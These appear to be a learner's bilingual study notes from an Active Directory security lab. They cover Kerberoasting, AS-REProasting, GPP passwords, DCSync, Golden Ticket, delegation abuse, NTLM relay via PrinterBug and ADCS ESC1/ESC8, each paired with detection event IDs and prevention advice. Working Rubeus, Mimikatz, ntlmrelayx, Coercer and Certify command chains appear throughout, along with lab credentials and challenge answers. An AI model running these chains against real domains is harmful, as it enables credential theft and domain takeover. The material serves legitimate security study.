# Terminology
## AD:
    - heart of Windows Enterprise >>
    - manage permissions and access to network resources.

    - Defenders' Friends >> Patch Management >> Defence in Depth >> Network Segmentation

    - `A regular AD user account` without privileged permissions can do some useful activities:
    - such as >>  **enumerate the majority of objects contained within AD**
        - Domain Computers / Domain Users / Domain Group Information / Default Domain Policy / Domain Functional Levels
        - Password Policy / Group Policy Objects (GPOs) / Kerberos Delegation / Domain Trusts / Access Control Lists (ACLs)

## Kerberos:
    - acts as a trusted third party
    - working with DC
    - authenticate clients trying to access services
    - Authentication over LDAP

    - KDC >> Key Distribution Center >> a Kerberos service installed on a DC that creates tickets
        - Components of the KDC are the `authentication server (AS)` and the `ticket-granting server (TGS)`.
    - Kerberos Tickets are tokens that serve as proof of identity
    - `TGT` is proof that the client submitted valid user information to the KDC.
    - `TGS` is created for each service the client `(with a valid TGT)` wants to access.

    - `KDC key` is an `encryption key` that proves the TGT is valid
    - AD creates the KDC key from the hashed password of the **KRBTGT account**,
        - KRBTGT >> **the first account created in an AD domain.**
        - stores secrets that are `randomly generated keys` in the `form of password hashes`.

    - **Enterprise Admins** >> has permissions over all domains in the forest
    - Escalation Example >> From Account Operators to Domain Admin
        - **'MSOL_' user accounts that Azure AD Connect creates upon installation** >>
        - this is located in `Users` container where `Account Operators` can modify user objects

## Real-World View:
    - **Active Directory is massive, complex, and feature-heavy - potential escalation risks are under every rock.**

    - **Active Directory has limitations: Complexity / Design / Legacy:**

    - Complexity >> nested groups >> every 'Domain user' indirectly a member of 'Domain Admins'.

    - Design     >> AD stores GPOs in a unique network `share/folder called SYSVOL`
        - For this file, every-domain-joint device should pull settings >> it means they access to DC
        - Through `SMB` >> **allows for code execution (a remote command shell, where commands will be executed on the Domain Controller)**
        - If has privileged-account >> **can consistently execute code over SMB on the Domain Controllers remotely.**

    - Legacy     >> Windows is made with a primary focus >> It works out of the box for most of Microsoft's customers.
        - is not secure by default
        - Example >> **Windows ships with the broadcasting - DNS-like protocols NetBIOS and LLMNR enabled by default.**
        - These protocols are meant to be used `if DNS fails.`
        - Cependant, they are active even `when it does not`


# Kerberoasting
- SPN >> Service Principal Name >> unique service indentifier
    - it tells which account runs a specific service
- Kerberos is the default authentication system in AD

## Attack Path
- Attack is associated with `tickets` and how they are `generated` for the services

    - **Attack Process:**
    1. They ask the domain: “Give me all accounts with SPNs.”
    2. They request the `tickets` for those services
    3. Then Kerberos will encrypt those `tickets` with the `password hash of the service account`
    4. Then the attackers takes the ticket >> to brute force the password offline

    - The password will brute forced using tools: `hashcat` `john the ripper`

    - **Example:**
    - Attack can be done with >> **Rubeus** tool >> `.\Rubeus.exe kerberoast /outfile:account_hashes.txt`
    - Later then: `hashcat -m 13100 -a 0 account_hashes.txt passwords.txt --outfile="cracked.txt"`
    - Or with: `sudo john account_hashes.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot`

## Prevention:
- Methods:
    - limit the number of accounts with SPNs
    - disable those no longer used/needed
    - Strong Password >> **100+ characters passwords** >> Max in AD is **127 chars**
- Windows Option:
    - Need to use `Group Managed Service Accounts (GMSA)` >>
    - **GMSA** >> **single account that can be used by multiple computers/services in Active Directory** Active Directory automatically manages it
    - Active Directory automatically rotates the password of these accounts to a **random 127 characters value**
    - *There is a caveat: not all applications support these accounts*

- Two Ways:
    - Strong passwords
    - Strong Encryption Algorithms: `AES`
    - Sometimes >> Attacker may downgrade to `RC4` or `DES`

## Detection:
- Ways:
    - TGS is created >> `ID 4769`
    - Event Viewer >> Account_Name >> Service Name >> Encryption Algorithm


## Honeypot:
- A **honeypot user** is a perfect detection option:
    - The account must be a relatively old user >> not new ones, threat actors are not fools
    - The password should not have been changed recently >> 2+, 5+ years ideally
    - The account must have some privileges assigned to it >> worth hunting for this account
    - The account must have an SPN registered, which appears legit

    - **Any attempt to this `honeypot user` is suspicious for you**

## Practical Challenges:
    1. Connect to the target and perform a Kerberoasting attack. What is the password for the svc-iam user?

    **Solved:**
    - I used the **Rubeus** tool for all accounts with SPNs in the Domain which my user is in windows machine:
    - I got the Three accounts with SPNs and their account password hashes
        - `.\Rubeus.exe kerberoast /outfile:hashes.txt`
    - I got the hashed credentials and using **John The Ripper** tool: I performed offline brute forcing
        - `john hashes.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot`
    - Voila >> j'ai obtenu le drapeau

    2. After performing the Kerberoasting attack, connect to DC1 and look at the logs in Event Viewer. What is the ServiceSid of the webservice user?

    **Solved:**
    - The idea is to switch immediatement au DC1
    - Puis, avec **Event Viewer** >> J'ai cherche les evenements:`4769` >> **TGS Requested**
    - J'ai trouve trois account avec TGS requests
    - Apres, J'ai obtenu le ServiceSid de account **webservice**
    - Voila, Felicitations! C'est fini!

# AS-REProasting
- AS >> Authentication Services
    - Roasting >> brute-forcing password hashes
    - REP >> Requests an AS-REP for accounts from the KDC (Key Distribution Center).
    - Reuses (replays) this AS-REP data or stores it for later, often in automated or repeated attacks – hence “Reproasting”.
- Similar to Kerberoasting Attack
    - `Do not require Kerberos preauthentication` property should be enabled
    - Goal >> to get **crackable hashes**

## Attack:
- Tool >> `Rubeus`  with action: `asreproast`
    - `.\Rubeus.exe asreproast /outfile:asrep.txt`
    - `we need to edit it by adding 23$ after $krb5asrep$` in the obtained hash
- Brute Forcing:
    - `hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force`

## Prevention:
- The success of this attack depends on **the strength of the password of users with Do not require Kerberos preauthentication configured**


## Detection:
- `Rubeus` leaves trace: **Event with ID 4768** >> (Kerberos Authentication ticket)


## Honeypot User:
- a user with no real use/need in the environment,
- no login attempts are performed regularly >> any attempt(s) to perform a login for this account is likely malicious and requires inspection
- **the only account with Kerberos Pre-Authentication not required.** >> not natural >> suspicious for the attackers >> so that avoid it


## Practical Challenges:
    1. Connect to the target and perform an AS-REProasting attack. What is the password for the user anni?

    **Solved:**
    - Using the `Rubeus` tool >>
    - I obtained the user's hashes with the vulnerable property: "Do not Require Kerberos Authentication"
    - Later then, using `john ripper` offline cracker I obtained the password
        - `john --format=krb5asrep hashes.txt --pot=results.txt`
    - It worked out >> Voila, c'est fini!

    2. After performing the AS-REProasting attack, connect to DC1 (Domain Controller 1), and look at the logs in Event Viewer.
       What is the TargetSid of the svc-iam user?

    **Solved:**
    - After the attack, as a defender I started to investigate the attack
    - Tool >> Event Viewer >> ID 4768 >> since `Kerberos Authentication Ticket` is requested.
    - Based on the timeline, I see that the associated user account with this Event ID
    - Voila >> J'ai obtenu le drapeau

# GPP Passwords
- Group Policy Passwords in AD
    - **used to configure user environments—like drive mappings, scheduled tasks, or local users.**
    - *Until 2014, Windows allowed administrators to set passwords (e.g., for local admin accounts) using GPPs.*
    - These passwords were stored **in SYSVOL, a shared directory that’s readable by all domain users.**

## Attack Scenario:
- Gain domain access (e.g., a low-privileged domain user)
    - Access the SYSVOL share on the domain controller:
        - \\<domain>\SYSVOL\<domain>\Policies\
    - Search for XML files that store credentials: Groups.xml >> ScheduledTasks.xml >> Services.xml >> Printers.xml
    - These files may contain encrypted passwords under the tag:
        - `<cpassword>gAAAA...==</cpassword>`

    - In XML >> files, it mentions the Usernames also:
        - <User clsid="{123...}">
            `<Properties action="U" userName="Admin123" password="gAAAAAB...==" />`
        - </User>
        -
    - Use a **known AES 256 static key (published by Microsoft!) to decrypt the password.**
        - **Microsoft hardcoded the encryption key for compatibility reasons, and it was publicly disclosed in 2012.**
    - Get the plaintext password and use it for lateral movement, privilege escalation, or persistence.

- Tools:
    - `Get-GPPPassword.ps1` by **PowerSploit**
        - `Import-Module .\Get-GPPPassword.ps1` >> `Get-GPPPassword`

## Prevention:
-  If an organization built its AD environment before 2014 >> **its credentials are still cached**
-  Since the patch will not clear the existing ones but only prevents the caching of new ones.
-  Check >> **SYSVOLS** >> GPP should no longer store passwords in new patched environments

## Detection:
- Cases:
    - **Accessing the XML file containing the credentials should be a red flag**

- IDs:
    - `4663` >> access to an object
    - `4624` >> Later then >> successful login by the compromised account
    - `4625` >> Later then >> failed login by the compromised account

## Honeypot:
- Technique:
    - **use a semi-privileged user with a Wrong Password**
    - In XML file  >> we put the Wrong Password to the certain account
    - **Any attempt with failed login attempts highlight us as suspicious**
- IDs:
    - **4625, 4771, and 4776**
    - `4776` >> when a domain controller (DC) attempts to validate the credentials of an account using NTLM over Kerberos
    - `4771` >> related to Kerberos authentication failures

## Practical Challenges:
    1. Connect to the target and run the Powersploit Get-GPPPassword function. What is the password of the svc-iis user?

    **Solved:**
    - It went interesting since in Powershell executionpolicy is set to Restricted
    - I bypassed this using scope >> temporary execution rights until the next session
        - `set-executionpolicy -scope Process` >> Then Bypass
    - Then, I imported the necessary module:
        - `Import-Module .\Get-GPPPassword.ps1`
        - `Get-GPPPassword`
    - Voila, j'ai obtenu le drapeau!

    2. After running the previous attack, connect to DC1 and look at the logs in Event Viewer. What is the Access Mask of the generated events?

    **Solved:**
    - I have connected to the Domain Controller
    - Tool: Using Event Viewer >> I filtered the logs for the **object access events** with `Event ID: 4663`
    - Then later I found out the associated account
    - Voici, j'ai obtenu the flag!

# GPO Permissions/GPO Files
- Detection
    - `Event ID 5136` >> when GPO is modified
- Honeypot
    - `Misconfigured GPO`
    - Consult to `detect_GPO_modified.ps1`

# Credentials in Shares
- Common Practices:
    - credentials in network shares within scripts and configuration files (batch, cmd, PowerShell, conf, ini, and config)
    - credentials in **Shares** or in **Machines** >> in  *Shares* is dangerous since it's accessible by every user

    - **a server's Users group contains Domain users as its member in Active Directory environments.**

    - **The administrator adding scripts with credentials to a share is unaware >> test their
        scripts in a scripts folder in the C:\ drive; however, if the folder is shared**

    - **in the case of hidden shares (folders whose name ends with a dollar sign $)**
        - `the misunderstanding comes from the fact that Explorer in Windows does not display files or folders whose name end with a $, however, any other           tool will show it`

## Attack
- Find Available Shares:
    - `Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess`
    - After the founded share >> `dev$`
    - We will look for the necessary data: using `Living Off The Land`
        - `findstr /m /s /i "pass" *.bat`
        - /s forces to search the current directory and all subdirectories
        - /i ignores case in the search term
        - /m shows only the filename for a file that matches the term.
        -  matching for the string pass
        -  Attractive targets for this search would be file types such as **.bat, .cmd, .ps1, .conf, .config, and .ini.**

## Prevention
- The best practice to prevent these attacks is to lock down every share in the domain so there are no loose permissions.

## Detection
- Goal >> **is to correlate user account with source of authentication**

    - Detection technique is discovering the one-to-many connections, for example, when `Invoke-ShareFinder` scans every domain device to obtain a list o      ts network shares. It would be abnormal for a workstation to connect to `100s or even 1000s of other devices simultaneously.`

    - **if Kerberos were used for authentication, event ID 4768 would be generated**

    - **successful logon with event ID 4624 for the Administrator account:**

## Honeypot
- a semi-privileged username with a wrong password.  >> service account, created 2+ years ago.
- With `fake password` >> Because it is a fake password, there is no risk of a threat agent compromising the account.
- Three event IDs `(4625, 4771, and 4776)` can indicate this.

## Practical Challenge:
    1. Connect to the target and enumerate the available network shares. What is the password of the Administrator2 user?

    **Solved:**
    - `findstr /m /s /i "eagle" *.ps1` through this command
    - J'ai trouve le drapeau

# Credentials in Object Properties
- **user's (or service account's) password in the Description or Info properties**

## Attack:
- A simple PowerShell script can query the entire domain by looking for specific search terms/strings in the Description or Info fields:
    - Consult to `credentials_finder.ps1`
    - run the script to hunt for the string `pass`
    - `SearchUserClearTextInformation -Terms "pass"`

## Detection
TGT Service is generated 4768

## Prevention
- Continuous Assessment
- Automate user creation process as much as possible
- Educate the Employees

## Honeypot
- set up honeypot user >> with **fake password**

## Practical Challenges
    1. Connect to the target and use a script to enumerate object property fields. What password can be found in the Description field of the bonni user?

    **Solved:**
     - apres faire le script, j'ai trouve le mot de pasword de bonni

    2. Using the password discovered in the previous question, try to authenticate to DC1 as the bonni user. Is the password valid?

    **Solved:**
    - No >> pourquoi? >> parceque le mot de password n'est pas correct pour DC1

    3. Connect to DC1 as 'htb-student:HTB_@cademy_stdnt!' and look at the logs in Event Viewer. What is the TargetSid of the bonni user?

    **Solved:**
    - J'ai utilise le Event ID 4625, 4776 >> mais avec ces IDs, Je n'ai pas trouve >> le event ID 4771 a fonctione bien

# DCSync
-  threat agents utilize to impersonate a Domain Controller and perform replication with a targeted Domain Controller to extract password hashes from Active Directory
    - The attack can be done through the account which has the following permissions:
    - **Replicating Directory Changes**
    - **Replicating Directory Changes All**

## Attack
- User with those privileges above
- `runas /user:eagle\rocky cmd.exe`
- **need to use Mimikatz, one of the tools with an implementation for performing DCSync**
    - `lsadump::dcsync /domain:eagle.local /user:Administrator`
    - We obtained the hash of Administrator account >>
    - `Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf`

## Prevention
-  replications happen between Domain Controllers all the time
-  Use >> **RPC Firewall >> can block or allow specific RPC calls with robust granularity**
-  *using RPC Firewall, we can only allow replications from Domain Controllers.*

## Detection
- Domain Controller replication generates an event with the **ID 4662**

## Practical Challenges
    1. Connect to the target and perform a DCSync attack as the user rocky (password:Slavi123). What is the NTLM hash of the Administrator user?

    **Solved:**
    - D'abbord, j'ai connecte au ordinateur, apres
    - J'ai utilise le Mimikatz et voila j'ai obtenu le drapeau

    2. After performing the DCSync attack, connect to DC1 as 'htb-student:HTB_@cademy_stdnt!' and look at the logs in Event Viewer. What is the Task Categ       ory of the events generated by the attack?

    **Solved:**
    - c'est tres interessant pour moi, car je sais exactement quell ID est utilise pour `replication` >> 4662
    - J'ai apres obtenu le drapeau


# Golden Ticket
-  threat agents can create/generate tickets for any user in the Domain >> Acting a DC
    - `krbtgt is created by default`
    - `krbtgt is a disabled account that cannot be deleted, renamed, or enabled`
    - **Domain Controller's KDC service will use the password of krbtgt to derive a key with which it signs all Kerberos tickets**
    -
    - Problem >> **any user possessing the password's hash of krbtgt can create valid Kerberos TGTs.**

## Attack
- Avec Mimikatz
    - /domain: The domain's name.
    - /sid: The domain's SID value.
    - /rc4: The password's hash of krbtgt.
    - /user: The username for which Mimikatz will issue the ticket (Windows 2019 blocks tickets if they are for inexistent users.
    - /id: Relative ID (last part of SID) for the user for whom Mimikatz will issue the ticket.
    - /renewmax: The maximum number of days the ticket can be renewed.
    - /endin: End-of-life for the ticket.
    -

    1. Utilize DCSync with Rocky's account from the previous attack to **obtain the hash**:
        `lsadump::dcsync /domain:eagle.local /user:krbtgt`
    2. Get-DomainSID function from PowerView to obtain the SID value of the Domain:

    3. Main command:
       `kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584
       /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt`

    4. Mimikatz injected the ticket in the current session, and we can verify that by running the command klist (after exiting from Mimikatz):


## Prevention
- Utilizing Microsoft's script for changing the password of **krbtgt KrbtgtKeys.ps1** is highly recommended
- Enforce **SIDHistory filtering** between the domains in forests to prevent the escalation from a child domain to a parent domain

## Detection
- If a mature organization uses `Privileged Access Workstations (PAWs)`,
- they should be alert to any privileged users not authenticating from those machines,
- proactively monitoring events with the `ID 4624 and 4625` (successful and failed logon).


- If SID filtering is enabled, we will get alerts with the event `ID 4675` during `cross-domain escalation.`

# Kerberos Constrained Delegation
- Three types of delegations in Active Directory:
    - Unconstrained Delegation (most permissive/broad)
    - Constrained Delegation >> `a user account will have its properties configured to specify which service(s) they can delegate`
    - Resource-based Delegation >> `the configuration is within the computer object to whom delegation occurs`
        - `the computer is configured as I trust only this/these accounts.`

## Attack
- Abuse of constrained delegation
    - when an account is trusted for delegation, the account sends a request to the KDC
    - saying that >> **Give me a Kerberos ticket for user YYYY because I am trusted to delegate this user to service ZZZZ**
    -  Kerberos ticket is generated for **user YYYY (without supplying the password of user YYYY)**

    -  It is also possible to delegate to another service, even if not configured in the user properties
    -  For example, if we are trusted to delegate for LDAP, we can perform protocol transition and be entrusted to any other service such as CIFS or HTTP.
    -

    1. We will use the `Get-NetUser` function from `PowerView` to **enumerate user accounts that are trusted for constrained delegation** in the domain:
       `Get-NetUser -TrustedToAuth`

    2. `web_service` >> configured for delegating the `HTTP service` to the Domain Controller DC1
       HTTP service provides the ability to execute `PowerShell Remoting`

    **Key moment:**
    >> any threat actor gaining control over web_service can request a Kerberos ticket for any user in Active Directory and use it to connect to DC1 over PowerShell Remoting.

    3. Get the hash: `.\Rubeus.exe hash /password:Slavi123`

    4. use Rubeus to get a ticket for the Administrator account:
    `.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local
      /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt`

      Now, administrator ticket is injected in the current session

    5. connect to the Domain Controller impersonating the account Administrator: >> `Enter-PSSession dc1`

## Prevention
- Configure the property Account is sensitive and cannot be delegated for all privileged users.
- Add privileged users to the Protected Users group: this membership automatically applies the protection mentioned above

## Detection
- S4U >> Service For User >> Microsoft extension to the Kerberos protocol that allows an application
    service to obtain a Kerberos service ticket on behalf of a user.

- a successful logon attempt with a delegated ticket will contain information about the ticket's issuer under the **Transited Services attribute** in the events log.
- This attribute is normally populated if the logon resulted from `an S4U (Service For User)` logon process.

## Practical Challenges
    1. Use the techniques shown in this section to gain access to the DC1 domain controller and submit the contents of the flag.txt file.

    **Solved:**
    - Apres, finishing all the steps, I initiated the Powershell Remoting and access to DC1
    - Enfin, j'ai obtenu le drapeau

# Print Spooler & NTLM Relaying
- Print Spooler >> old service enabled by default
    - force a remote machine to perform a connection to any other machine it can reach
    - the reverse connection will carry `authentication information as a TGT`
    -  **any domain user can coerce `RemoteServer$` to authenticate to any machine**
    -  it will not be fixed, as the issue is "by-design".

## Attack
- Some Scenarios:
    The impact of PrinterBug is that any Domain Controller that has the Print Spooler enabled can be compromised in one of the following ways:
    -
    1. Relay the connection to another DC and perform DCSync (if SMB Signing is disabled).

    2. Force the Domain Controller to connect to a machine configured for Unconstrained Delegation (UD) - this will cache the TGT in the memory of the UD        server, which can be captured/exported with tools like Rubeus and Mimikatz.

    3. Relay the connection to Active Directory Certificate Services to obtain a certificate for the Domain Controller. Threat agents can then use the cer       tificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).

    4. Relay the connection to configure Resource-Based Kerberos Delegation for the relayed machine. We can then abuse the delegation to authenticate as a        ny Administrator to that machine

    What we do >> ** will relay the connection to another DC and perform DCSync**

    1. we will configure `NTLMRelayx` to forward any connections to DC2 and attempt to perform the DCSync attack:
    `impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support`
    - This command is listening on smb connection to get ntlm authentication credentials >> then it
        does dcsync attact to the machine with given IP-address
    2. we need to `trigger the PrinterBug using the Kali box` with NTLMRelayx listening.
    With **Dementor** tool
    - `python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123`
    - when running from a non-domain joined machine, any authenticated user credentials are required, and in this case, we assumed that we had previously       compromised Bob)

    3. After triggering, NTLMRelayx will capture credentials >> does DCSync >> We will get the hash of krbtgtb



## Prevention
- `Print Spooler` >> should be disabled on all servers that are not printing servers.
- Disable >>  **registry key RegisterSpoolerRemoteRpcEndPoint**
    -  any incoming remote requests get blocked; this acts as if the service was disabled for remote clients.

## Detection
- In the case of using NTLMRelayx to perform DCSync, no event ID 4662 is generated
-

## Honeypot
-  use the PrinterBug as means of alerting on suspicious behavior in the environment.
-  we would block outbound connections from our servers to ports 139 and 445 >> software or physical firewalls can achieve this
-  Even though abuse can trigger the bug, the firewall rules will disallow the reverse connection to reach the threat agent
-  However, those blocked connections will act as signs of compromise for the blue team


# Coercing Attacks & Unconstrained Delegation
- any domain user can coerce RemoteServer$ to authenticate to any machine in the domain
    - the `Coercer tool` was developed to exploit all known vulnerable `RPC functions simultaneously.`

## Attack
- Key Idea: >> **Force the Domain Controller to connect to a machine configured for Unconstrained Delegation (UD) -
               this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like Rubeus and Mimikatz.**

    1. To identify systems configured for Unconstrained Delegation, we can use the Get-NetComputer function from PowerView
        along with the -Unconstrained switch:
        >> `Get-NetComputer -Unconstrained | select samaccountname`
        **WS001 and SERVER01 are trusted for Unconstrained delegation (Domain Controllers are trusted by default)**

    2. We will start Rubeus in an administrative prompt to monitor for new logons and extract TGTs:
    `.\Rubeus.exe monitor /interval:1` >> to listen

    3. In Kali, Execute `Coercer` towards DC1, while we force it to connect to WS001
    - `Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local`
    - we switch to WS001 and look at the continuous output that Rubeus provide, there should be a TGT for DC1 available:
    - We can use this TGT for authentication within the domain, becoming the Domain Controller

    How we use the obtained ticket >> `.\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...`

    4. a DCSync attack can be executed through mimikatz, essentially by replicating what we did in the DCSync section.
    - `.\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"`

## Prevention
- Block Domain Controllers and other core infrastructure servers from connecting `to outbound ports 139 and 445`,
    - except to machines that are required for AD (as well for business operations)

## Detection
-  The **RPC Firewall** from `zero networks` is an excellent method of detecting the abuse of these functions

# Object ACLs
- Access Control Lists (ACLs) are tables, or simple lists, that define the trustees who have access to a specific object and their access type

- Each access control list has a set of access control entries (ACE),

## Attack
- To identify `potential abusable ACLs`, we will use **BloodHound** to `graph the relationships between the objects`
-  `SharpHound` to scan the environment and `pass` All to the `-c` parameter (short version of `CollectionMethod`):

    1. `.\SharpHound.exe -c All`
    - The ZIP file generated by SharpHound can then be visualized in BloodHound

    2. Also: we can use **ADACLScanner to create reports of discretionary access control lists (DACLs) and system access control lists (SACLs).**

## Prevention
- Educate Employees >> Continuous Assessment >> Automate

## Detection
- ID 4738, "A user account was changed", is generated.

## Honeypot
- Assign relatively high ACLs to a user account used as a honeypot via a previously discussed technique—for example, a user whose fake credentials are exposed in the description field.

# PKI - ESC1
- Context:
    - **Active Directory Certificate Services (AD CS)** >> After SpectreOps released the research paper Certified Pre-Owned
    1. `Using certificates for authentication has more advantages than regular username/password credentials.`
    2. `Most PKI servers were misconfigured/vulnerable to at least one of the eight attacks
        discovered by SpectreOps (various researchers have discovered more attacks since then).`

- Advantages:
    - advantages to using certificates and compromising the **Certificate Authority (CA)**:

    1. Users and machines certificates are valid for 1+ years.
    2. Resetting a user password does not invalidate the certificate. With certificates, it doesn't matter how many times a user changes their password;         the certificate will still be valid (unless expired or revoked).

    3. Misconfigured templates allow for obtaining a certificate for any user.
    4. Compromising the CA's private key results in forging Golden Certificates.

    **ESC1:**
    - The description of ESC1 is:
    - *Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates +
       CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT.*

## Attack
    1. To begin with, we will use `Certify` to scan the environment for vulnerabilities in the PKI infrastructure:
    - `.\Certify.exe find /vulnerable`
    - When checking the 'Vulnerable Certificate Templates' section, the given template **UserCert**
        is vulnerable since:
        1. All Domain users can request a certificate on this template.
        2. The flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is present, allowing the requester to specify the `SAN`
            **(therefore, any user can request a certificate as any other user in the network, including privileged ones).**
        3. Manager approval is not required (the certificate gets issued immediately after the request without approval).
        4. The certificate can be used for 'Client Authentication' (we can use it for login/authentication).

    2. Abusing this template:
    - `.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator`
    - Use `Certify` and pass the argument request by specifying the full name of the CA, the name of the vulnerable template, and the name of the user,
    - for example, Administrator:

    3. Once the attack finishes, we will obtain a certificate successfully.
    4. We need to convert the PEM certificate to the PFX format b
    - ` sed -i 's/\s\s\+/\n/g' cert.pem`
    -  `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`

    5. Now that we have **the certificate** in a usable PFX format (which Rubeus supports),
       we can request a **Kerberos TGT** for the **account Administrator and authenticate with the certificate:**

       - `.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt`
       - Voila, the ticket is injected in the current session and working bien
       -
## Prevention
    - The attack would not be possible if the **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** flag is `not enabled` in the certificate template
    - Another protection >> **require CA certificate manager approval**

## Detection
    - When the CA generates the certificate, >> **IDs of 4886 and 4887**

    - If we want to find the `SAN information`, we'll need to `open the certificate itself`:

## Practical Challenges
    1. After performing the ESC1 attack, connect to PKI (172.16.18.15) as 'htb-student:HTB_@cademy_stdnt!' and look at the logs. On what date was the very first certificate requested and issued?

    **Solved:**
    - `runas /user:eagle\htb-student powershell`
    - `New-PSSession PKI`
    - `Enter-PSSession PKI`
    - `Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4886'}`
    - `Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4887'}`
    >> through this I got the flag
    -
    - **To view the full audit log of the events, we can pipe the output into Format-List**
    - `$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}`
    - `$events[0] | Format-List -Property *`

# PKI - ESC8
- Context:
    - we will utilize the PrinterBug, and with the received reverse connection, we will relay to ADCS to obtain a certificate for the machine we coerced.

## Attack
    1. NTLMRelayx to forward incoming connections to the HTTP endpoint of our Certificate Authority
    -  we will specify that we want to obtain a certificate for the Domain Controller (a default template in AD,
    -  which Domain Controllers use for client authentication)
    -  the `--adcs` switch makes NTLMRelayx parse and displays the certificate if one is received:

    - `impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs`

    2. we need to get the Domain Controller to connect to us
        - We’ll use the Print Spooler bug and force a reverse connection to us
        - In this case, we are forcing DC2 to connect to the Kali machine while we have NTLMRelayx listening in another terminal:
        - `python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123`
        -
        - **we will see that an incoming request from DC2$ was relayed and a certificate was successfully obtained:**
        - This certificate is for **DC$2**

    3. use Rubeus to the certificate to authenticate with and obtain a TGT:
        - `.\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:MIIRbQIBAzCCEScGCSqGSI<SNIP>`
        - TGT for DC2 is obtained with certificate

    4. **We have now obtained a TGT for the Domain Controller DC2. Therefore we become DC2.
       Being a Domain Controller, we can now trigger DCSync with Mimikatz:**
        - `.\mimikatz_trunk\x64\mimikatz.exe "lsadump::dcsync /user:Administrator" exit`

    - **This is successful impersonation of DC2 and performing DCSync to obtain Administrator's password hash**

## Prevention
- The attack was possible because:
    1. We managed to coerce DC2 successfully
    2. ADCS web enrollment does not enforce HTTPS (otherwise, relaying would fail, and we won't request a certificate)

    **Highly advised to regularly scan the environment with Certify or other similar tools to find potential issues.**


## Detection
- Point
    - **a certificate is requested by NTLMRelayx, we will see that the CA has flagged both the
        request and the issuer of the certificate in events ID 4886 and 4887, respectively:**

## Practical Challenges
    1. Replicate the attack described in this section and view the related 4886 and 4887 logs.
       Enter the name shown in the Requester field as your answer. (Format: EAGLE\....)


    **Solved:**
    - I have used Event Viewer  for the filter IDs >> 4886 & 4887
    - J'ai trouve l'information necessaire pour le drapeau
    - Voila, c'est fini










